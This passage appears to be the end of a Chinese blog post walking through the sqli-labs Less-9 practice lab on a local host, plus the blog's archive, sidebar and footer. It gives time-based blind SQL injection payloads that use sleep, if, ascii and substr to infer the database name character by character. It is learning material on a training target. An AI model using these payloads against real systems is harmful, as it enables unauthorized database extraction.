+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-9/?id=1' and sleep(10)--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://i2.tiimg.com/690112/c337f5a66c2a8602.png" alt="在这里插入图片描述"><br>发现确实延迟了10秒，所以判断<code>&#39;</code>为闭合符号。<br>再使用延时注入前，需要知道几个时间注入的函数</p>
+<blockquote>
+<p>sleep()                             //延迟函数<br>if(condition,true,false)               //条件语句<br>ascii()                              //转换成ascii码<br>substr(“string”,strart,length)      //取出字符串里的第几位开始，长度多少的字符</p>
+</blockquote>
+<p><strong>判断数据库名长度</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span> <span class="keyword">and</span> <span class="keyword">if</span>(length(database())&gt;<span class="number">1</span>,sleep(<span class="number">4</span>),<span class="number">0</span>) --+</span><br></pre></td></tr></table></figure></p>
+<p><strong>爆出数据库名</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;M,sleep(<span class="number">5</span>),<span class="number">0</span>) --+</span><br></pre></td></tr></table></figure></p>
+<p>原理很明显，提取数据库中的第一个字符，转化为ascll码，然后和<code>M</code>相比较，如果大于则睡5秒，否则不睡，这样就可以判断出第一个字符。通过改变<code>substr函数</code>后面的<code>两个变量和M</code>，我们就可以对数据库名进行猜解。</p>
+<p>不建议手工注入，效率会很低，写一个python脚本跑一下就可以爆出来，目前自己还在学习python，等学完之后再写一个盲注的脚本，直接用别人的总感觉不太好。<strong>sql-labs(十)</strong>大致也是基于时间盲注的原理，只不过闭合符号不同罢了，就先学习到这里。</p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/06/15/Bugku—MISC题总结/" title="Bugku—MISC题总结">
+                    <div class="nextTitle">Bugku—MISC题总结</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/05/31/ISCC2019杂项题(MISC)总结/" title="ISCC2019-MISC总结">
+                    <div class="prevTitle">ISCC2019-MISC总结</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:12345@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/bealright" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/blog.csdn.net/qq_43431158" class="iconfont-archer csdn" target="_blank" title="csdn"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-一"><span class="toc-number">1.</span> <span class="toc-text">sql-labs(一)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-二"><span class="toc-number">2.</span> <span class="toc-text">sql-labs(二)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-三"><span class="toc-number">3.</span> <span class="toc-text">sql-labs(三)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-四"><span class="toc-number">4.</span> <span class="toc-text">sql-labs(四)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-五"><span class="toc-number">5.</span> <span class="toc-text">sql-labs(五)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-六"><span class="toc-number">6.</span> <span class="toc-text">sql-labs(六)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-八"><span class="toc-number">7.</span> <span class="toc-text">sql-labs(八)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-九"><span class="toc-number">8.</span> <span class="toc-text">sql-labs(九)</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 51
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href="/2019/10/27/通过sql-labs进行sql注入学习(11-22)/">通过sql-labs进行sql注入学习(11-22)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href="/2019/10/24/任意文件下载漏洞/">任意文件下载漏洞简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/2019/10/23/从一道题深入HTTP协议与HTTP请求走私/">从一道题深入HTTP协议与HTTP请求走私</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href="/2019/10/15/BUUCTF web(一)/">BUUCTF web(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href="/2019/10/04/Jarvis OJ web(一)/">Jarvis OJ web(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/27</span><a class="archive-post-title" href="/2019/09/27/I春秋——web Write up(三)/">I春秋——web Write up(三)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href="/2019/09/25/I春秋——web Write up(二)/">I春秋——web Write up(二)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/2019/09/05/XCTF(攻防世界)—进阶web题Write Up(二)/">XCTF(攻防世界)—进阶web题Write Up(二)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/2019/09/02/Bugku—web题总结(三)/">Bugku—web题总结(三)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href="/2019/08/31/了解PHP伪协议/">了解PHP伪协议</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/28</span><a class="archive-post-title" href="/2019/08/28/python学习（函数）/">python学习（函数）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href="/2019/08/25/Bugku—web题总结(二)/">Bugku—web题总结(二)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href="/2019/08/18/Bugku—web题总结(一)/">Bugku—web题总结(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href="/2019/08/16/XCTF(攻防世界)—进阶web题Write Up(一)/">XCTF(攻防世界)—进阶web题Write Up(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href="/2019/08/14/PHP危险函数总结/">PHP危险函数总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/12</span><a class="archive-post-title" href="/2019/08/12/PHP反序列化漏洞学习(一)/">PHP反序列化漏洞学习(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/10</span><a class="archive-post-title" href="/2019/08/10/DVWA——命令执行漏洞学习/">DVWA——命令执行漏洞学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href="/2019/08/09/文件包含漏洞——DVWA练习/">文件包含漏洞——DVWA练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href="/2019/08/07/密码学——RSA加密算法原理/">密码学——RSA加密算法原理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href="/2019/08/05/实验吧——SQL注入 Write up(一)/">实验吧——SQL注入 Write up(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href="/2019/08/03/文件上传漏洞——upload-labs(11-20)/">文件上传漏洞——upload-labs(11-20)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2019/08/01/文件上传漏洞——upload-labs(1-10)/">文件上传漏洞——upload-labs(1-10)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href="/2019/07/31/文件上传漏洞——DVWA练习/">文件上传漏洞——DVWA练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href="/2019/07/29/python学习（字典、用户输入和while循环）/">python学习（字典、用户输入和while循环）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/25</span><a class="archive-post-title" href="/2019/07/25/sql注入学习——时间盲注/">sql注入学习——时间盲注</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/24</span><a class="archive-post-title" href="/2019/07/24/sql注入学习——布尔盲注/">sql注入学习——布尔盲注</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span><a class="archive-post-title" href="/2019/07/22/python学习（操作列表、if语句）/">python学习（操作列表、if语句）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href="/2019/07/19/XSS学习-XSS挑战之旅(二)/">XSS学习-XSS挑战之旅(二)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2019/07/18/实验吧— Crypto Write up(一)/">实验吧— Crypto Write up(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/2019/07/17/I春秋——web Write up(一)/">I春秋——web Write up(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/16</span><a class="archive-post-title" href="/2019/07/16/2019安恒七月月赛——MISC/">2019安恒七月月赛——MISC</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/14</span><a class="archive-post-title" href="/2019/07/14/I春秋—— Crypto Write up(一)/">I春秋—— Crypto Write up(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href="/2019/07/12/实验吧—(部分)MISC Write up/">实验吧—(部分)MISC Write up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href="/2019/07/11/python学习（字符串、整数、列表）/">python学习（字符串、整数、列表）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/10</span><a class="archive-post-title" href="/2019/07/10/XCTF(攻防世界)—新手web题Write Up/">XCTF(攻防世界)—新手web题Write Up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/19</span><a class="archive-post-title" href="/2019/06/19/C++学习总结（函数、类与对象）/">C++学习总结（函数、类与对象）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href="/2019/06/15/Bugku—MISC题总结/">Bugku—MISC题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/09</span><a class="archive-post-title" href="/2019/06/09/通过sql-labs进行sql注入学习(1-10)/">通过sql-labs进行sql注入学习(1-10)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href="/2019/05/31/ISCC2019杂项题(MISC)总结/">ISCC2019-MISC总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/CTF 关于ZIP解题过程/">CTF关于ZIP解题思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href="/2019/05/09/CTF隐写总结/">CTF隐写总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span><a class="archive-post-title" href="/2019/05/08/CTF Crypto(密码学)总结/">CTF密码学总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span><a class="archive-post-title" href="/2019/04/28/web安全—XSS攻击(二)/">XSS学习-XSS挑战之旅(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/2019/04/24/web安全-XSS攻击（一)/">XSS理解+练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href="/2019/04/22/PHP学习总结（数据库概念、DDL语句、DML语句）/">PHP数据库概念、DDL语句、DML语句</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/2019/04/20/PHP学习总结(会话控制)/">PHP会话控制</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/2019/04/18/PHP学习(php概念、基本语法、流程控制)/">PHP概念、基本语法、流程控制</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href="/2019/03/24/HTML学习总结/">HTML学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href="/2019/03/20/HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页/">本地搭建简易的登陆注册网页</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href="/2019/03/18/CSS学习总结/">CSS学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href="/2019/03/12/hexo+githup搭建属于自己的博客/">搭建属于自己的博客</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="C++"><span class="iconfont-archer">&#xe606;</span>C++</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令执行"><span class="iconfont-archer">&#xe606;</span>命令执行</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="任意文件下载"><span class="iconfont-archer">&#xe606;</span>任意文件下载</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件包含"><span class="iconfont-archer">&#xe606;</span>文件包含</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSS"><span class="iconfont-archer">&#xe606;</span>CSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="HTML"><span class="iconfont-archer">&#xe606;</span>HTML</span>
+    
+        <span class="sidebar-tag-name" data-tags="hexo"><span class="iconfont-archer">&#xe606;</span>hexo</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
+    
+        <span class="sidebar-tag-name" data-tags="HTTP请求走私"><span class="iconfont-archer">&#xe606;</span>HTTP请求走私</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="MISC"><span class="iconfont-archer">&#xe60a;</span>MISC</span>
+    
+        <span class="sidebar-category-name" data-categories="web"><span class="iconfont-archer">&#xe60a;</span>web</span>
+    
+        <span class="sidebar-category-name" data-categories="编程语言学习"><span class="iconfont-archer">&#xe60a;</span>编程语言学习</span>
+    
+        <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "💗zihao"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+	<!-- 雪花特效 -->
+	<script type="text/javascript" src="\lib\snow.js"></script>
+	<!-- 页面点击小红心 -->
+	<script type="text/javascript" src="\lib\love.js"></script>
+    </body>
+</html>
+
+
